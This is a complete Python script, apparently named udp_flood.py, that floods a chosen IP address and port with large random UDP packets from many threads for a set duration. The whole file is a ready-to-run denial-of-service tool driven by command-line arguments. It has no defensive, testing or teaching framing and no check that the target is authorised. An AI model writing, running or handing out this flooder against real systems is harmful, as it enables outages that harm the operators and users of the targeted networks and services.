import sys
import socket
import random
import threading
import time
from datetime import datetime, timedelta

class UDP_Flood:
    def __init__(self, target_ip, target_port, duration, threads):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.threads = threads
        self.stop_attack = False

    def generate_payload(self):
        return random._urandom(65500)  # Max UDP packet size

    def udp_attack(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = self.generate_payload()
        while not self.stop_attack:
            try:
                sock.sendto(payload, (self.target_ip, self.target_port))
            except:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def start(self):
        end_time = datetime.now() + timedelta(seconds=self.duration)
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.udp_attack)
            t.daemon = True
            threads.append(t)
            t.start()
        
        while datetime.now() < end_time:
            time.sleep(0.1)
        
        self.stop_attack = True
        for t in threads:
            t.join()

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python udp_flood.py <IP> <PORT> <DURATION> <THREADS>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    threads = int(sys.argv[4])
    
    attack = UDP_Flood(target_ip, target_port, duration, threads)
    attack.start()